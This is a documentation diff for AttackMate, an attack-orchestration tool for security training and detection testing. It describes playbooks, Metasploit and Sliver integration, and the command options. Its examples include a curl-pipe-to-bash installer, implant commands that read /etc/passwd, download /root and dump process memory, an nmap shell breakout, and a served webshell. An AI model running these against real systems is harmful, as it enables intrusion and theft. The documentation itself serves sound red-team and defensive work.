@@ -1,0 +1,3670 @@
+output_1.txtindex.rst
+file content ...
+
+.. AttackMate documentation master file, created by
+   sphinx-quickstart on Thu May  4 12:55:27 2023.
+   You can adapt this file completely to your liking, but it should at least
+   contain the root `toctree` directive.
+
+Welcome to AttackMate's documentation!
+==================================
+
+.. toctree::
+   :maxdepth: 1
+   :caption: General:
+
+   readme_link
+
+.. toctree::
+   :maxdepth: 1
+   :caption: Getting Started:
+
+   about
+   how
+   installation/index
+   preparation/index
+   configuration/index
+   basic
+
+
+
+.. toctree::
+   :maxdepth: 4
+   :caption: Playbook:
+
+   playbook/structure
+   playbook/vars
+   playbook/commands/index
+   playbook/session/index
+   playbook/examples
+
+.. toctree::
+   :maxdepth: 1
+   :caption: Development:
+
+   attackmate/attackmate
+
+Indices and tables
+==================
+
+* :ref:`genindex`
+* :ref:`modindex`
+* :ref:`search`
+
+----------------------------
+
+readme_link.md
+file content ...
+
+```{include} ../../README.md
+:relative-images:
+```
+
+----------------------------
+
+basic.rst
+file content ...
+
+===========
+Basic Usage
+===========
+
+AttackMate ships with a executable stub called "attackmate" that can be called like follows:
+
+::
+
+   attackmate -h
+   usage: attackmate [-h] --config CONFIG [--debug] [--version] [--json] [--append_logs]
+
+   AttackMate is an attack orchestration tool that executes full attack-chains based on playbooks.
+
+   options:
+     -h, --help       show this help message and exit
+     --config CONFIG  Attack-Playbook in yaml-format
+     --debug          Enable verbose output
+     --version        show program's version number and exit
+     --json           log commands to attackmate.json
+     --append_logs    append logs to attackmate.log, output.log and attackmate.json instead of overwriting
+
+   (Austrian Institute of Technology) https://aecid.ait.ac.at Version: 0.2.0
+
+Sample Playbook
+===============
+
+In our first example we use the following playbook.yml:
+
+.. code-block:: yaml
+
+   vars:
+     NMAP: /usr/bin/nmap
+     TARGET: localhost
+     WEBPORT: "8000"
+
+   commands:
+     - type: shell
+       cmd: $NMAP -sC -p $WEBPORT $TARGET
+
+     - type: regex
+       cmd: (\d+)/tcp open\s+http
+       input: RESULT_STDOUT
+       output:
+         PORT: $MATCH_0
+
+     - type: shell
+       cmd: nikto -host $TARGET -port $PORT
+       only_if: $PORT == 8000
+
+.. warning::
+
+   For this playbook it is required to have nmap and nikto installed!
+   This playbook also needs a webserver at localhost on port 8000.
+   You can run ``python3 -mhttp.server`` in a seperate shell to start
+   the webserver.
+
+
+First Run
+=========
+
+Now we can run the playbook using the following command:
+(We can supply the full path to the playbook, otherwise the parser tries to find it in the current working directory or in the folder /etc/attackmate/playbooks)
+
+::
+
+  $ attackmate --debug playbook.yml
+    2023-09-24 20:17:36 DEBUG   | No config-file found. Using empty default-config
+    2023-09-24 20:17:36 DEBUG   | Template-Command: '$NMAP -sC -p $WEBPORT $TARGET'
+    2023-09-24 20:17:36 INFO    | Executing Shell-Command: '/usr/bin/nmap -sC -p 8000 localhost'
+    2023-09-24 20:17:37 DEBUG   | Template-Command: '(\d+)/tcp open\s+http'
+    2023-09-24 20:17:37 WARNING | RegEx: '(\d+)/tcp open\s+http'
+    2023-09-24 20:17:37 DEBUG   | {'MATCH_0': '8000'}
+    2023-09-24 20:17:37 DEBUG   | Template-Command: 'nikto -host $TARGET -port $PORT'
+    2023-09-24 20:17:37 INFO    | Executing Shell-Command: 'nikto -host localhost -port 8000'
+
+Explanation
+===========
+
+In the **vars**-section we have three variables That can be used later in the **commands**-section.
+The nmap-binary is expected at the location */usr/bin/nmap*. The target to attack is *localhost* and
+the web-port to attack is *8000*.
+
+::
+
+  vars:
+    NMAP: /usr/bin/nmap
+    TARGET: localhost
+    WEBPORT: "8000"
+
+The first command executes an nmap-script-scan on port *8000* at *localhost*. This command illustrates
+how to use variables:
+
+::
+
+  commands:
+    - type: shell
+      cmd: $NMAP -sC -p $WEBPORT $TARGET
+
+As soon as nmap finishes, it automatically stores the output the the built-in variable ``RESULT_STDOUT``.
+The regex command executes a regex search using the content of the nmap output. The regular expression is
+`(\d+)/tcp open\s+http`. If the expression matches, it will "group" the port number in the variable
+``$MATCH_0`` which is a volatile variable and is deleted after the regex-command finishes. In the setting
+*output* is a variable defined with the name ``PORT`` and it will be set with the value of ``$MATCH_0``.
+
+::
+
+    - type: regex
+      cmd: (\d+)/tcp open\s+http
+      input: RESULT_STDOUT
+      output:
+        PORT: $MATCH_0
+
+The final command is again a shell command that is supposed to execute a nikto scan using the previously
+parsed variable ``$PORT``. This command will only be executed if the condition ``$PORT == 8000`` is **True**.
+
+::
+
+    - type: shell
+      cmd: nikto -host $TARGET -port $PORT
+      only_if: $PORT == 8000
+
+----------------------------
+
+about.rst
+file content ...
+
+=====
+About
+=====
+
+Attackmate is a command line tool that can perform entire attack chains based on playbooks. It can be used for cybersecurity training as well as for testing detection engines. Attackmate is so designed that any part of an attack can be easily replaced or varied. Furthermore, the playbooks enable the portability and reproducibility of attack chains. A key focus was on user-friendliness and flexibility for attack chain designers.
+
+.. image:: images/Demo.gif
+
+----------------------------
+
+conf.py
+file content ...
+
+# Configuration file for the Sphinx documentation builder.
+#
+# For the full list of built-in configuration values, see the documentation:
+# https://www.sphinx-doc.org/en/master/usage/configuration.html
+
+# -- Project information -----------------------------------------------------
+# https://www.sphinx-doc.org/en/master/usage/configuration.html#project-information
+
+import os
+import sys
+sys.path.insert(0, os.path.abspath('../..'))
+
+project = 'AttackMate'
+copyright = '2023, Wolfgang Hotwagner'
+author = 'Wolfgang Hotwagner'
+release = '0.2.1'
+
+# -- General configuration ---------------------------------------------------
+# https://www.sphinx-doc.org/en/master/usage/configuration.html#general-configuration
+
+extensions = ['sphinx.ext.autodoc', 'sphinx.ext.napoleon', 'myst_parser', 'sphinx_toolbox.confval']
+
+templates_path = ['_templates']
+exclude_patterns = []  # type: ignore
+
+# -- Options for HTML output -------------------------------------------------
+# https://www.sphinx-doc.org/en/master/usage/configuration.html#options-for-html-output
+
+html_theme = 'sphinx_rtd_theme'
+html_static_path = ['_static']
+
+html_theme_options = {
+    'logo_only': False,
+    'navigation_depth': 2,
+    'collapse_navigation': True,
+}
+
+----------------------------
+
+output_1.txt
+file content ...
+
+
+----------------------------
+
+how.rst
+file content ...
+
+============
+How it works
+============
+
+Attackmate is designed so that there can be different commands in a playbook which can be executed by corresponding executors. For example, there are executors that can orchestrate Metasploit or executors for the Sliver framework. The attacks that are carried out are real attacks and require vulnerable systems to be successful.
+
+.. image:: images/attackmate-schema.png
+
+----------------------------
+
+configuration/index.rst
+file content ...
+
+.. _Overview:
+
+=============
+Configuration
+=============
+
+The configuration file can be passed via the ``--config`` parameter. If this parameter
+is not used, attackmate will search at the following locations for the config-file:
+
+#. **.attackmate.yml**
+#. **$HOME/.config/attackmate.yml**
+#. **/etc/attackmate.yml**
+
+The optional configuration-file is in yaml-format and is divided into three sections:
+
+* **cmd_config**: defines settings for all commands
+* **msf_config**: connection settings for the msfrpcd
+* **sliver_config**: connection settings for the sliver-api
+
+The following configuration file is an example for a basic configuration with
+sliver and metasploit:
+
+.. code-block:: yaml
+
+   ###
+   cmd_config:
+     loop_sleep: 5
+
+   msf_config:
+     password: securepassword
+     server: 127.0.0.1
+
+   sliver_config:
+     config_file: /home/attacker/.sliver-client/configs/attacker_localhost.cfg
+
+For detailed information about the config sections see:
+
+.. toctree::
+   :maxdepth: 4
+
+   config_vars
+   command_config
+   msf_config
+   sliver_config
+
+----------------------------
+
+configuration/command_config.rst
+file content ...
+
+==========
+cmd_config
+==========
+
+Stores global variables for command options. These are settings for **all** commands.
+
+.. code-block:: yaml
+
+   ###
+   cmd_config:
+     loop_sleep: 5
+
+.. confval:: loop_sleep
+
+   All commands can be configured to be executed in a loop. For example: if a command
+   does not deliver the expected output, the command can be executed again until the
+   output has the expected value. Between the executions can be a sleep time of certain
+   seconds.
+
+   :type: int
+   :default: 5
+
+----------------------------
+
+configuration/msf_config.rst
+file content ...
+
+.. _msf_config:
+
+==========
+msf_config
+==========
+
+msf_config holds settings for the Metasploit modules and sessions.
+Most of these settings control the Metsaploit RPC connection.
+
+.. code-block:: yaml
+
+   ###
+   msf_config:
+     password: securepassword
+     server: 10.18.3.86
+
+.. confval:: server
+
+   This option stores the servername or ip-address of the msfrpcd
+
+   :type: str
+   :default: 127.0.0.1
+
+
+.. confval:: password
+
+   This option stores the password of the rpc-connection.
+
+   :type: str
+   :default: None
+
+
+.. confval:: ssl
+
+   This option enables encryption for the rpc-connection
+
+   :type: bool
+   :default: True
+
+
+.. confval:: port
+
+   This option sets the port for the rpc-connection.
+
+   :type: int
+   :default: 55553
+
+
+.. confval:: uri
+
+   This option sets uri of the rpc-api.
+
+----------------------------
+
+configuration/sliver_config.rst
+file content ...
+
+.. _sliver_config:
+
+=============
+sliver_config
+=============
+
+sliver_config stores all settings to controll the connection to the sliver-API.
+
+.. code-block:: yaml
+
+   ###
+   sliver_config:
+     config_file: /home/attacker/.sliver-client/configs/attacker_localhost.cfg
+
+.. confval:: config_file
+
+   Path to the sliver-client configfile.
+
+   :type: str
+
+----------------------------
+
+preparation/index.rst
+file content ...
+
+===========
+Preparation
+===========
+
+Even though AttackMate can be used out of the box, for some commands
+it is necessary to install and set up the corresponding tools. The following
+pages are going to explain how to setup and install :ref:`Sliver <prep_sliver>`
+and :ref:`Metasploit <prep_msf>`
+
+.. toctree::
+   :maxdepth: 1
+   :hidden:
+
+   metasploit
+   sliver
+
+----------------------------
+
+preparation/metasploit.rst
+file content ...
+
+.. _prep_msf:
+
+==================
+Prepare Metasploit
+==================
+
+It is recommended to install Metasploit as it is described in the
+`Metasploit documentation <https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html>`_.
+If you run Kali Linux, you could also install it from the Kali Linux repositories using apt:
+
+::
+
+  $ sudo apt update && sudo apt install metasploit-framework
+
+
+AttackMate needs the RPC-daemon(msfrpcd) for communication with Metasploit.
+It is possible to protect the daemon with a password. The following example
+starts the msfrpcd with a password:
+
+::
+
+  $ msfrpcd -P securepassword
+
+After starting the msfrpcd it will listen on all interface at port ``55553``.
+
+----------------------------
+
+preparation/sliver.rst
+file content ...
+
+.. _prep_sliver:
+
+==============
+Prepare Sliver
+==============
+
+`Sliver <https://github.com/BishopFox/sliver>`_ is a Post-Exploitation framework with implants for Linux, Windows and MacOs.
+In order to use the sliver-commands in AttackMate, a sliver installation is required.
+Sliver offers an API on port ``31337`` which is used by AttackMate to interact with it.
+Follow the `Instructions offered by BishopFox <https://github.com/BishopFox/sliver>`_
+to install the Sliver Framework. The simplest method is a curl oneliner:
+
+::
+
+  $ curl https://sliver.sh/install|sudo bash
+
+Sliver will create an operator named "root" and save the configs under ``/root/.sliver-client/configs``
+which can be used by AttackMate.
+
+attackm8 only works if daemon-mode is enabled: ``"daemon-mode": "true"`` in the sliver-server under ``.sliver/configs/server.json``
+
+----------------------------
+
+playbook/vars.rst
+file content ...
+
+.. _variables:
+
+=========
+Variables
+=========
+
+Variables may be assigned to by a statement of the form of key-values.
+Once assigned, they can be used as placeholders in command-settings. It
+is unnecessary to begin variable names with a $-sign when defined in the
+vars-section. However, when variables are placed in the commands section,
+they always must start with a $-sign.
+If the same variable name with the prefix "ATTACKMATE_" exists as an
+environment variable it will overwrite the playbook variable value.
+i.e. the playbookvariabel $FOO will be overwritten be environment variabel
+$ATTACKMATE_FOO.
+
+.. code-block:: yaml
+
+   ###
+   vars:
+     $SERVER_ADDRESS: 192.42.0.254
+     # the $-sign is not necessary here:
+     $NMAP: /usr/bin/nmap
+
+   commands:
+     - type: shell
+       # the $-sign is required when using the variable:
+       cmd: $NMAP $SERVER_ADDRESS
+
+.. note::
+
+   For more information about using the variables see `string.Template <https://docs.python.org/3/library/string.html#string.Template>`_
+
+
+.. note::
+
+   variables in cmd settings of a loop command will be substituted on every iteration of the loop, see :ref:`loop`
+
+Builtin Variables
+=================
+
+The following variables are set by the system:
+
+``RESULT_STDOUT`` is set after every command execution and stores the result output.
+
+``RESULT_CODE`` is set after every command execution and stores the returncode.
+
+``LAST_MSF_SESSION`` is set every time after a new metasploit session was created and contains the session number.
+
+``LAST_SLIVER_IMPLANT`` is set every time after a new sliver implant was created and contains the path to the implant file.
+
+``LAST_FATHER_PATH`` is set every time when a father-rootkit was generated.
+
+``REGEX_MATCHES_LIST`` is set every time a regex command yields matches and it contains a list of all matches. Note that if sub or split does not have a match the input string is returned.
+
+----------------------------
+
+playbook/structure.rst
+file content ...
+
+=========
+Structure
+=========
+
+AttackMate playbooks must be written in valid `YAML-format <https://yaml.org/>`_ and require at least a :ref:`commands section <commands>`:
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: shell
+       cmd: nmap www.vulnerable-system.tld
+     - type: shell
+       cmd: nikto -host www.vulnerable-system.tld
+
+Usually playbooks also contain a :ref:`variable section <variables>` which contains all the placeholders
+that can be used to build commands:
+
+.. code-block:: yaml
+
+   ###
+   vars:
+     TARGET: www.vulnerable-system.tld
+     NMAP: /usr/bin/nmap
+     NIKTO: /usr/bin/nikto
+
+   commands:
+     - type: shell
+       cmd: $NMAP -T4 $TARGET
+     - type: shell
+       cmd: $NIKTO -host $TARGET
+
+----------------------------
+
+playbook/examples.rst
+file content ...
+
+========
+Examples
+========
+
+The following example playbooks require an installed `Metasploitable2 <https://docs.rapid7.com/metasploit/metasploitable-2/>`_ virtual machine and
+a `Kali Linux <https://www.kali.org/>`_ with some packages installed:
+
+* AttackMate
+* NMap
+* THC Hydra
+* Metasploit
+* nikto
+* curl
+
+.. note::
+
+   It is advised to copy the example playbooks to the directory "./playbooks"
+
+Prepare Kali-Linux:
+
+::
+
+  $ sudo apt install nikto nmap curl seclists hydra
+  $ cp -r examples playbooks
+
+Playbooks
+---------
+
+* `HTTP-client example <https://github.com/ait-aecid/attackmate/blob/main/examples/http-put_example.yml>`_
+* `Include command example <https://github.com/ait-aecid/attackmate/blob/main/examples/include.yml>`_
+* `Only If example <https://github.com/ait-aecid/attackmate/blob/main/examples/only_if.yml>`_
+* `SSH/SFTP example <https://github.com/ait-aecid/attackmate/blob/main/examples/ssh_example.yml>`_
+* `Upgrade meterpreter shell <https://github.com/ait-aecid/attackmate/blob/main/examples/upgrade_to_meterpreter.yml>`_
+* `Fileshare via webserv example <https://github.com/ait-aecid/attackmate/blob/main/examples/webserv.yml>`_
+* `Command injection and MSF multi handler example <https://github.com/ait-aecid/attackmate/blob/main/examples/webdemo.yml>`_
+
+----------------------------
+
+playbook/session/index.rst
+file content ...
+
+.. _session:
+
+=====================
+Sessions, Interactive
+=====================
+
+Many commands of AttackMate support the setting "session" or "interactive.
+This chapter is about these important concepts of AttackMate.
+
+Session
+-------
+
+Attackmate executes all commands stateless. Therefore, each command is executed in a new "environment".
+What "environment" means depends on the type of the command. For example, every stateless shell
+command spawns a new shell process. As illustrated in the following image, every shell command
+is executed in a new `/bin/sh` process.
+
+.. image:: /images/Stateless-Command.png
+
+The ssh-command on the other hand, establishes with every new stateless execution a new SSH connection.
+AttackMate will log in to the target with every single command execution. However, sometimes you want the AttackMate not to log on to the target system every time you execute a command. To achieve this, you can use sessions.
+
+Many commands support the "creates_session" option. This allows you to specify a session name and AttackMate saves the environment of the command. By using the session name for further commands, it is possible to continue where the previous command left off at any time. The following figure shows how the first command uses create_session to execute a stateful command. The third command can then continue in the same environment as the first command by using the session.
+
+.. image:: /images/Stateful-Command.png
+
+Interactive
+-----------
+
+Many commands work in such a way that they first execute something and then collect and return the output. Sometimes, however, commands are executed that do not produce any output. In such cases, AttackMate would wait forever. One such example would be executing the text editor vim on the command line. Vim is started and waits for input. AttackMate gets no output, or the process does not terminate and so it waits forever. Interactive mode is available for such cases. This mode causes commands to be executed for a limited time only. After this time has elapsed, AttackMate continues.  The following example shows how AttackMate executes vim with the help of a session and the interactive mode in a shell command and then types keyboard strokes into the open vim sessions.
+
+.. code-block:: yaml
+
+   commands:
+     - type: shell
+       cmd: "vim /tmp/test\n"
+       interactive: True
+       creates_session: vim
+
+     - type: shell
+       cmd: ":inoremap jj <ESC>\n"
+       interactive: True
+       session: vim
+
+     - type: shell
+       cmd: "o"
+       interactive: True
+       session: vim
+
+     - type: shell
+       cmd: "Hello World"
+       interactive: True
+       session: vim
+
+     - type: shell
+       cmd: "jj"
+       interactive: True
+       session: vim
+
+     - type: shell
+       cmd: ":wq!\n"
+       interactive: True
+       session: vim
+
+.. warning::
+
+      Please note that you **MUST** send a newline when you execute interactive commands!
+
+----------------------------
+
+playbook/commands/shell.rst
+file content ...
+
+
+=====
+shell
+=====
+
+Execute local shell-commands.
+
+.. code-block:: yaml
+
+   ###
+   vars:
+     $SERVER_ADDRESS: 192.42.0.254
+     $NMAP: /usr/bin/nmap
+
+   commands:
+     - type: shell
+       cmd: $NMAP $SERVER_ADDRESS
+
+.. confval:: cmd
+
+   The command-line that should be executed locally.
+
+   :type: str
+
+.. confval:: creates_session
+
+   A session name that identifies the session that is created when
+   executing this command. This session-name can be used by using the
+   option "session".
+
+   :type: str
+
+.. confval:: session
+
+   Reuse an existing interactive session. This setting works only if another
+   shell-command was executed with the command-option "creates_session" and "interactive" true
+
+   :type: str
+
+.. confval:: interactive
+
+   When the shell-command is executed, the command will block until the execution finishes.
+   However, for some exploits it is necessary to run a command and send keystrokes to an
+   interactive session. For example run with the first command "vim" and with the second command
+   send keystrokes to the open vim-session. In interactive-mode the command will try reading the
+   output until no output is written for a certain amount of seconds.
+
+   This mode works only on unix and unix-like operating systems!
+
+   .. warning::
+
+      Please note that you **MUST** send a newline when you execute a ssh-command interactively.
+
+   :type: bool
+   :default: ``False``
+
+   .. code-block:: yaml
+
+      commands:
+        # creates new ssh-connection and session
+        - type: shell
+          cmd: "nmap --interactive\n"
+          interactive: True
+          creates_session: "attacker"
+
+        # break out of the nmap-interactive-mode
+        - type: shell
+          cmd: "!sh\n"
+          interactive: True
+          session: "attacker"
+
+.. confval:: command_timeout
+
+   The interactive-mode works with timeouts while reading the output. If there is no output for some seconds,
+   the command will stop reading.
+
+   :type: int
+   :default: ``15``
+
+.. confval:: read
+
+   Wait for output. This option is useful for interactive commands that do not return any output.
+   Normally attackmate will wait until the command_timeout was reached. With read is False, attackmate
+   will not wait for any output and simply return an empty string.
+
+   :type: bool
+   :default: ``True``
+
+.. confval:: command_shell
+
+   Use this shell when executing commands.
+
+   :type: str
+   :default: ``/bin/sh``
+
+.. confval:: bin
+
+   Enable binary mode. In this mode only hex-characters are allowed.
+
+   :type: bool
+   :default: ``False``
+
+   .. code-block:: yaml
+
+      commands:
+        - type: shell
+          # hex-code for "id"
+          cmd: "6964"
+          bin: True
+
+----------------------------
+
+playbook/commands/index.rst
+file content ...
+
+.. _commands:
+
+========
+Commands
+========
+
+The *'commands-section'* holds a list of AttackMate-commands that are executed sequentially from
+top to bottom.
+
+Every command, regardless of the type has the following general options:
+
+.. confval:: cmd
+
+   *cmd* defines the command that should be executed. The purpose of this option varies depending on the type of command.
+
+   :type: str
+
+.. confval:: save
+
+   Save the output of the command to a file.
+
+   :type: str
+
+   .. code-block:: yaml
+
+      commands:
+        - type: shell
+          cmd: nmap localhost
+          save: /tmp/nmap_localhost.txt
+
+.. confval:: exit_on_error
+
+   If this option is true, attackmate will exit with an error if the command returns with a return code
+   that is not zero.
+
+   :type: bool
+   :default: ``True``
+
+.. confval:: error_if
+
+   If this option is set, an error will be raised if the string was found in the **output**
+   of the command.
+
+   :type: str(regex)
+
+   .. code-block:: yaml
+
+      commands:
+        # throw an error
+        - type: http-client
+          cmd: get
+          url: https://www.google.com
+          error_if: ".*bing.*"
+
+
+.. confval:: error_if_not
+
+   If this option is set, an error will be raised if the string was not found in the **output**
+   of the command.
+
+   :type: str(regex)
+
+   .. code-block:: yaml
+
+      commands:
+        # throw an error
+        - type: http-client
+          cmd: get
+          url: https://www.google.com
+          error_if_not: ".*bing.*"
+
+
+.. confval:: loop_if
+
+   If this option is set, the command will be executed again if the string was found in the
+   **output** of the command.
+
+   :type: str(regex)
+
+   .. code-block:: yaml
+
+      commands:
+        # loop until max-loop-count reached:
+        - type: http-client
+          cmd: get
+          url: https://www.google.com
+          loop_if_not: ".*google.*"
+
+
+.. confval:: loop_if_not
+
+   If this option is set, the command will be executed again if the string was not found in the
+   **output** of the command.
+
+   :type: str(regex)
+
+   .. code-block:: yaml
+
+      commands:
+        # loop until max-loop-count reached:
+        - type: http-client
+          cmd: get
+          url: https://www.google.com
+          loop_if_not: ".*bing.*"
+
+.. confval:: loop_count
+
+   Number of Repetitions if *loop_if* or *loop_if_not* matches.
+
+   :type: ini
+   :default: ``3``
+
+.. confval:: only_if
+
+   Execute this command only if the condition is true. The following operators are supported:
+
+   * var1 == var2
+   * var1 != var2
+   * var1 is var2
+   * var1 is not var2
+   * var1 < var2
+   * var1 <= var2
+   * var1 > var2
+   * var1 >= var2
+   * string !~ pattern
+   * string =~ pattern
+   * not var
+   * var
+   * None
+
+   :type: str(condition)
+
+   The =~ operator is used to check if a string matches a regular expression pattern.
+   The !~ operator is used to check if a string does not match a regular expression pattern.
+
+   .. code-block:: yaml
+
+      commands:
+        - type: shell
+          cmd: pgrep mysqld
+
+        - type: regex
+          mode: split
+          cmd: "\n"
+          output:
+            KILLPID: $MATCH_0
+
+        # Execute this command only
+        # if it is not the init-process
+        - type: shell
+          cmd: kill $KILLPID
+          only_if: $KILLPID > 1
+
+        # Execute this command only if the regex pattern is found
+        - type: shell
+          cmd: echo "regex match found"
+          only_if: some_string =~ some[_]?string
+
+
+.. confval:: background
+
+   Execute the command as a subprocess in background. If set to *True*,
+   the functionality for *error_if* and *error_if_not* as well as printing
+   the output is disabled.
+
+   Background-Mode is currently not implemented for the following commands:
+
+   * SSHCommand
+   * SFTPCommand
+   * MsfModuleCommand
+   * IncludeCommand
+
+   :type: bool
+   :default: ``False``
+
+   .. note::
+
+      The command in background-mode will not change global variables like
+      RESULT_STDOUT or RESULT_CODE.
+
+.. confval:: kill_on_exit
+
+   If this command runs in background-mode, the option *kill_on_exit* controls
+   if the main process will wait for this subprocess before exitting or if the
+   main process will simply kill the subprocess.
+
+   :type: bool
+   :default: ``True``
+
+.. confval:: metadata
+
+   The option *metadata* can be used to pass a dictionary of key value pairs.
+   These are not used in command execution but are logged together with the command.
+
+   :type: Dict
+   :default: None
+
+   .. code-block:: yaml
+
+      commands:
+        - type: debug
+          cmd: Come on, Cat
+          metadata:
+            version: 1
+            author: Ellen Ripley
+
+
+The next pages will describe all possible commands in detail.
+
+.. toctree::
+   :maxdepth: 4
+   :hidden:
+
+   debug
+   father
+   httpclient
+   include
+   json
+   loop
+   mktemp
+   msf-module
+   msf-session
+   payload
+   regex
+   setvar
+   shell
+   sftp
+   sleep
+   sliver
+   sliver-session
+   ssh
+   webserv
+
+----------------------------
+
+playbook/commands/sliver-session.rst
+file content ...
+
+.. _sliver_session:
+
+==============
+sliver-session
+==============
+
+There are multiple commands from type 'sliver-session' to execute commands in an
+active sliver session.
+
+ls
+--
+
+List files and directories on the remote host
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: ls
+       remote_path: /etc
+       session: implant-name
+
+
+.. confval:: remote_path
+
+   Path to list all files
+
+   :type: str
+   :required: ``True``
+
+.. confval:: session
+
+   The name of the sliver implant to connect to. Defined previously by the by sliver generate_implant command.
+
+   :type: str
+   :required: ``True``
+
+
+cd
+--
+
+Change the working directory
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: cd
+       remote_path: /home
+       session: implant-name
+
+
+.. confval:: remote_path
+
+   Path to change to
+
+   :type: str
+   :required: ``True``
+
+
+netstat
+-------
+
+Print network connection information
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: netstat
+       tcp: True
+       udp: True
+       ipv4: True
+       ipv6: False
+       listening: True
+       session: implant-name
+
+
+.. confval:: tcp
+
+   Display information about TCP sockets
+
+   :type: bool
+   :default: ``True``
+
+.. confval:: udp
+
+   Display information about UDP sockets
+
+   :type: bool
+   :default: ``True``
+
+.. confval:: ipv4
+
+   Display information about IPv4 sockets
+
+   :type: bool
+   :default: ``True``
+
+.. confval:: ipv6
+
+   Display information about IPv6 sockets
+
+   :type: bool
+   :default: ``True``
+
+.. confval:: listening
+
+   Display information about listening sockets
+
+   :type: bool
+   :default: ``True``
+
+
+execute
+-------
+
+Execute a program on the remote system
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: execute
+       exe: /usr/bin/grep
+       args:
+         - root
+         - /etc/passwd
+       output: True
+       session: implant-name
+
+
+.. confval:: exe
+
+   Command to execute
+
+   :type: str
+   :required: ``True``
+
+.. confval:: args
+
+   List of command arguments
+
+   :type: List[str]
+
+.. confval:: output
+
+   Capture command output
+
+   :type: bool
+   :default: ``True``
+
+
+mkdir
+-----
+
+Create a remote directory.
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: mkdir
+       remote_path: /tmp/somedirectory
+       session: implant-name
+
+
+.. confval:: remote_path
+
+   Path to the directory to create
+
+   :type: str
+   :required: ``True``
+
+
+ifconfig
+--------
+
+View network interface configurations
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: ifconfig
+       session: implant-name
+
+ps
+--
+
+List processes of the remote system
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: ps
+       session: implant-name
+
+
+pwd
+---
+
+Print working directory of the active session.
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: pwd
+       session: implant-name
+
+download
+--------
+
+Download a file or directory from the remote system. Directories will be downloaded as a gzipped tar-file.
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: download
+       remote_path: /root
+       recurse: True
+       session: implant-name
+
+
+.. confval:: remote_path
+
+   Path to the file or directory to download
+
+   :type: str
+   :required: ``True``
+
+.. confval:: local_path
+
+   Local path where the downloaded file will be saved.
+
+   :type: str
+   :required: ``False``
+   :default: ``.``
+
+.. confval:: recurse
+
+   Recursively downloaded all files in a directory.
+
+   :type: bool
+   :default: ``False``
+
+upload
+------
+
+Upload a file to the remote system.
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: upload
+       remote_path: /tmp/somefile
+       local_path: /home/user/somefile
+       session: implant-name
+
+.. confval:: remote_path
+
+   Path to the file or directory to upload to
+
+   :type: str
+   :required: ``True``
+
+.. confval:: local_path
+
+   Local path to the file to upload
+
+   :type: str
+
+.. confval:: is_ioc
+
+   Track uploaded file as an ioc
+
+   :type: bool
+   :default: ``False``
+
+
+process_dump
+------------
+
+Dumps the process memory of a given pid to a local file.
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver-session
+       cmd: process_dump
+       pid: 102
+       local_path: /home/user/some_service.dump
+       session: implant-name
+
+.. confval:: pid
+
+   Target Pid
+
+   :type: int
+   :required: ``True``
+
+
+.. confval:: local_path
+
+   Save to file.
+
+   :type: str
+   :required: ``True``
+
+
+rm
+--
+
+Delete a remote file or directory.
+
+.. confval:: remote_path
+
+   Path to the file to remove
+
+   :type: str
+   :required: ``True``
+
+.. confval:: recursive
+
+   Recursively remove files
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: force
+
+   Ignore safety and forcefully remove files
+
+   :type: bool
+   :default: ``False``
+
+
+terminate
+---------
+
+Kills a remote process designated by PID
+
+.. confval:: pid
+
+   PID of the process to kill.
+
+   :type: int
+   :required: ``True``
+
+.. confval:: force
+
+   Disregard safety and kill the PID.
+
+   :type: bool
+   :default: ``False``
+
+----------------------------
+
+playbook/commands/debug.rst
+file content ...
+
+=====
+debug
+=====
+
+This command prints out strings and variables and is for debugging
+purposes only.
+
+   .. code-block:: yaml
+
+      ###
+      vars:
+        $SERVER_ADDRESS: 192.42.0.254
+        $NMAP: /usr/bin/nmap
+
+      commands:
+        - type: debug
+          cmd: "$NMAP $SERVER_ADDRESS"
+          varstore: True
+
+.. confval:: cmd
+
+   A message to print on the screen.
+
+   :type: str
+   :default: ``empty_string``
+
+
+.. confval:: varstore
+
+   Print out all variables that are stored in the VariableStore.
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: exit
+
+   This setting causes the programm to exit when the command was
+   executed. It will exit with an error in order to indicate
+   that this is an exceptional break.
+
+   :type: bool
+   :default: ``True``
+
+----------------------------
+
+playbook/commands/webserv.rst
+file content ...
+
+=======
+webserv
+=======
+
+Start a http-server and share a file. This command
+will return after the first HTTP-request.
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: webserv
+       local_path: "/tmp/webshell.php"
+       port: 8000
+
+
+.. confval:: local_path
+
+   Path to the file to share
+
+   :type: str
+   :required: ``True``
+
+
+.. confval:: port
+
+   Port to listen
+
+   :type: int
+   :default: ``8000``
+
+.. confval:: address
+
+   Address to listen
+
+   :type: str
+   :default: ``0.0.0.0``
+
+----------------------------
+
+playbook/commands/include.rst
+file content ...
+
+=======
+include
+=======
+
+Include and run commands from another yaml-file.
+
+.. code-block:: yaml
+
+      # main.yml:
+      vars:
+        FOO: "hello world"
+      commands:
+        - type: debug
+          cmd: Loading commands from another file
+
+        - type: include
+          local_path: do_work.yml
+
+        - type: debug
+          cmd: Finished run from another file
+
+
+      # do_work.yml:
+      commands:
+        - type: debug
+          cmd: $FOO
+
+.. confval:: local_path
+
+   Path to the yaml-file
+
+   :type: str
+   :required: ``True``
+
+----------------------------
+
+playbook/commands/setvar.rst
+file content ...
+
+======
+setvar
+======
+
+Set a variable. This could be used for string interpolation or for
+copying variables.
+
+.. code-block:: yaml
+
+   ###
+   vars:
+     FOO: "WORLD"
+
+   commands:
+     - type: setvar
+       cmd: HELLO $FOO
+       variable: BAR
+
+.. confval:: variable
+
+   The variable-name that stores the value of *cmd*
+
+   :type: str
